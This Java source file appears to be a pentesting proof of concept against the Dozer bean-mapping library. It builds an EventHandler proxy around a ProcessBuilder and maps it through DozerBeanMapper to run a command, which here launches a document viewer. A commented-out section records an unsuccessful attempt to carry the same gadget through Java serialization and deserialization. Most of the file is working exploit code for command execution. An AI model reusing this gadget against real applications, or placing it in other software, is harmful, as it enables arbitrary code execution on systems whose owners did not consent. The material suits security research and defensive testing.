package com.javapentesting;

import org.dozer.DozerBeanMapper;
import java.beans.EventHandler;
import java.util.*;
import java.io.*;

public class App 
{
    public static void main( String[] args )
    {
        DozerBeanMapper mapper = new DozerBeanMapper(Arrays.asList(new String[]{"file:/tmp/dozerBeanMapping.xml"}));
        Dachshund longDog = mapper.map(EventHandler.create(Collection.class, new ProcessBuilder("/usr/bin/evince"), "start"), Dachshund.class);
/*
 * Below is some experimental code, trying to get an attack to survive serialization/deserialization (which doesn't work)
      try
      {
         FileOutputStream fileOut =
         new FileOutputStream("/tmp/employee.ser");
         ObjectOutputStream out = new ObjectOutputStream(fileOut);
         out.writeObject(EventHandler.create(Collection.class, new ProcessBuilder("/usr/bin/evince"), "start"));
         out.close();
         fileOut.close();
         System.out.printf("Serialized data is saved in /tmp/employee.ser");
      }catch(IOException i)
      {
          i.printStackTrace();
      }

      Collection coll = null;
      try
      {
         FileInputStream fileIn = new FileInputStream("/tmp/employee.ser");
         ObjectInputStream in = new ObjectInputStream(fileIn);
         coll = (Collection) in.readObject();
         in.close();
         fileIn.close();
      }catch(IOException i)
      {
         i.printStackTrace();
         return;
      }catch(ClassNotFoundException c)
      {
         System.out.println("Employee class not found");
         c.printStackTrace();
         return;
      }

         DozerBeanMapper mapper = new DozerBeanMapper(Arrays.asList(new String[]{"file:/home/dfj/software/dozer/dozersploit/dozerBeanMapping.xml"}));
     //   Dachshund longDog = mapper.map(EventHandler.create(Collection.class, new ProcessBuilder("/usr/bin/evince"), "start"), Dachshund.class);
     Dachshund longDog = mapper.map(coll, Dachshund.class);
     */
    }
}
